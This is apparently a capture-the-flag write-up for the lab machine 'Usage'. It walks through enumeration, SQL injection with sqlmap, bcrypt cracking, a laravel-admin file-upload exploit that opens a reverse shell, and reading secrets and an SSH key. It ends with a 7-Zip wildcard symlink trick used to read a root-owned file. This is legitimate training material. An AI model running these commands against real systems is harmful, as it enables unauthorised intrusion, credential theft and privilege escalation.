# Usage: Easy

```sh
sudo vim /etc/hosts
# add usage.htb

nmap -T4 -p- -A -Pn -v usage.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
    * 80/tcp: http: nginx 1.18.0

* checking the webpage, we have a webpage titled 'Daily Blogs', and we get a login page with fields 'email' and 'password'; there is also an optional checkbox for 'Remember Me'

* the other links on the website include:

    * /login: webpage login
    * /registration: register user
    * admin.usage.htb: admin page
    * /forget-password: password reset for login

* add the subdomain 'admin.usage.htb' to ```/etc/hosts```

* web enumeration:

    ```sh
    feroxbuster -u http://usage.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,js,md --extract-links --scan-limit 3 --filter-status 400,401,403,404,405,500,503 --silent
    # dir scan
    # custom codes 403,503 added to filter false positives

    ffuf -c -u 'http://usage.htb' -H 'Host: FUZZ.usage.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 -fs 178 -s
    # subdomain scan

    feroxbuster -u http://admin.usage.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,js,md --extract-links --scan-limit 3 --filter-status 400,401,403,404,405,500,503 --silent
    # dir scan for other subdomain
    ```

* ```feroxbuster``` finds two additional pages: '/dashboard' and '/robots.txt': the former needs logging in, and the latter does not include any info

* we can intercept requests in Burp Suite to understand the working of the webapp: which is based on the Laravel framework

* when we try to login with a non-existent email and password, the page does not show any clues or messages about the email/password

* on submitting the login request, a POST call to '/post-login' is made with the parameters '_token' (token value taken from webpage source code), 'email' & 'password'; then a redirect GET to '/login' is called as the creds are incorrect

* checking the admin page at 'http://admin.usage.htb', we get the admin login page with username and password fields

* trying weak creds like 'admin:admin' and 'admin:password' does not work here; the page makes a POST call to '/admin/auth/login' with data parameters 'username', 'password', 'remember' (for the 'remember' checkbox) and '_token': but no indicators for existing users are found

* checking the forgot password option for 'usage.htb', if we submit a test email like 'admin@usage.htb', we can see that a POST request to the endpoint '/forget-password' is made with data parameters '_token' and 'email'; and we get the response 'email address does not match in our records'

* we can register a test user at '/registration' and login using the test creds

* after logging in, we are able to access the dashboard page: the page contains some blog posts on server-side language pentesting

* checking the admin subdomain, we have a few links in the login page source code, like '/vendor/laravel-admin/AdminLTE/dist/css/AdminLTE.min.css': but they are for CSS & JS files

* we can try [enumerating and pentesting Laravel framework for both subdomains](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/laravel.html):

    * check if Laravel is in debugging mode by navigating to '/profiles'

    * test common deserialization RCE exploits like CVE-2018-15133 and CVE-2021-3129

    * check for exposed files like '.env' and 'composer.json'

* as the attempts to search for sensitive files and common CVEs fail, we can try common attacks against the webapp

* we can start with testing for SQLi in all input fields:

    * intercept the login requests for both 'usage.htb' and 'admin.usage.htb', and 'Copy to File' in Burp Suite to save the requests to a file

    * similarly, intercept the forgot password request for 'usage.htb' at '/forget-password', and in Burp Suite select 'Copy to File' to save the request

    * we can try automated testing first using ```sqlmap```:

        ```sh
        sqlmap -r usage.req --level 5 --risk 3 --batch --dump

        sqlmap -r admin-usage.req --level 5 --risk 3 --batch --dump

        sqlmap -r forget.req --level 5 --risk 3 --batch --dump
        ```
    
    * SQLi works and ```sqlmap``` is able to identify the 'email' parameter as vulnerable in the forget password request

    * it is able to fetch multiple tables for the DB 'usage_blog': the tables 'admin_users' and 'users' look interesting

    * to save time, we can dump specific table contents:

        ```sh
        sqlmap -r forget.req --level 5 --risk 3 --batch --dump -p 'email' -T admin_users

        sqlmap -r forget.req --level 5 --risk 3 --batch --dump -p 'email' -T users
        ```

* ```sqlmap``` dumps the contents of the users tables, and we get password hashes for 3 users: admin, raj (raj@raj.com), and raj (raj@usage.htb)

* checking the format of the hashes using online tools shows that it is using bcrypt algorithm: we can use ```hashcat``` mode 3200 to crack it:

    ```sh
    vim hashes
    # paste the 3 hashes

    hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt
    ```

* ```hashcat``` is able to crack the hashes and gives us the creds 'admin:whatever1' and 'raj:xander'

* we can try re-using the creds 'raj:xander' for the SSH login, but this does not work

* we can try logging into the admin dashboard at 'http://admin.usage.htb' using the creds 'admin:whatever1', and this works

* the dashbaord page shows the following version info:

    * PHP version: PHP/8.1.2-1ubuntu2.14
    * Laravel version: 10.18.0
    * uname: Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64

* the footer mentions the 'env' as local, and the version as 1.8.17: but we do not know what is the software name used here

* we can check the sidebar settings and its options for any clues

* checking the operation log option, we can scroll through the website logs for any info

* one of the older logs includes a PUT request to the '/admin/auth/setting' endpoint, and leaks the 'Administrator' user hashes; ```hashcat``` cracks this to cleartext password 'admin': this would have been the default password likely

* checking the source code of the page for details on the webapp, we can see that it mentions the name 'laravel-admin'

* Googling for exploits associated with laravel-admin 1.8.17 leads to [CVE-2023-24249: an arbitrary file upload vuln for RCE](https://github.com/advisories/GHSA-g857-47pm-3r32)

* we can try using [this exploit script](https://github.com/IDUZZEL/CVE-2023-24249-Exploit):

    ```sh
    nc -nvlp 4444
    # setup listener

    python3 exploit.py

    python3 exploit.py -u http://admin.usage.htb -U admin -P whatever1 -i 10.10.14.95 -p 4444
    # this works and we get reverse shell
    ```

* in reverse shell:

    ```sh
    whoami
    # dash

    ls -la

    ls -la /var/www/html
    # check web files

    cat /var/www/html/project_admin/.env

    cat /var/www/html/usage_blog/.env

    ls -la /home
    # two users - 'dash' and 'xander'
    ```

* the file ```/var/www/html/project_admin/.env``` gives the MySQL DB creds 'staff:s3cr3t_c0d3d_1uth'; same creds found in ```/var/www/html/usage_blog/.env```

* also the box has two users: 'dash' and 'xander': we can check the 'dash' user directory as we have access:

    ```sh
    ls -la /home/dash
    # check files

    ls -la /home/dash/.ssh

    cat /home/dash/.ssh/id_rsa
    ```

* as the 'dash' user has a SSH directory, we can copy the private key file to our machine, and login as 'dash' via SSH:

    ```sh
    # on attacker
    vim dash_rsa
    # paste SSH key

    chmod 600 dash_rsa

    ssh -i dash_rsa dash@usage.htb
    # this works
    ```

    ```sh
    id
    # dash

    ls -la

    cat user.txt
    # user flag

    cat .monitrc
    ```

* there is a non-default file '.monitrc': checking this file shows there is an internal webapp on port 2812 with creds 'admin:3nc0d3d_pa$$w0rd', and it monitors the system for any high usages

* but, checking with ```ss -ltnp``` does not show any internal services running on port 2812

* we can try re-using this password '3nc0d3d_pa$$w0rd' for 'dash' and 'xander' users:

    ```sh
    sudo -l
    # the password does not work for 'dash'

    su xander
    # this works
    ```

* we have access as 'xander' now:

    ```sh
    cd

    ls -la

    sudo -l
    ```

* ```sudo -l``` shows that 'xander' can run ```/usr/bin/usage_management``` as all users

* we can try running this binary as root using ```sudo /usr/bin/usage_management```, and it gives us 3 choices:

    * project backup
    * backup MySQL data
    * reset admin password

* if we select an option like project backup by entering '1', the webpages are backed up: it uses 7-Zip for this

* the process logs show the p7zip version 16.02 is used here

* Googling for exploits associated with p7zip 16.02 leads to [CVE-2022-47069: a buffer overflow vuln](https://nvd.nist.gov/vuln/detail/CVE-2022-47069): but there are no exploits associated with this that can be used in this case

* we can check the binary for any other details:

    ```sh
    strings /usr/bin/usage_management
    ```

* using the ```strings``` command, we can see that the 7zip command to backup the project is ```/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *```

    * ```a``` - add files to archive
    * ```-tzip``` - creates ZIP instead of 7z archive
    * ```-snl``` - store symbolic links as links
    * ```-mmt``` - multi-threading
    * ```--``` - separator for filenames
    * ```*``` - shell wildcard

* Googling for wildcard abuse in this case for 7zip leads to this [hacktricks blog](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#7-zip--7z--7za): we can attempt this exploit:

    * we need to create the malicious file in the current working directory for the binary: this is ```/var/www/html``` for the binary, as seen from the ```strings``` output:

        ```sh
        cd /var/www/html

        ln -s /root/root.txt test.txt

        touch @test.txt
        # tells 7z to use 'test.txt' as file list
        ```
    
    * now we can run the binary again:

        ```sh
        sudo /usr/bin/usage_management
        # select option 1
        ```
    
    * the project backup logs read & print the root flag this time
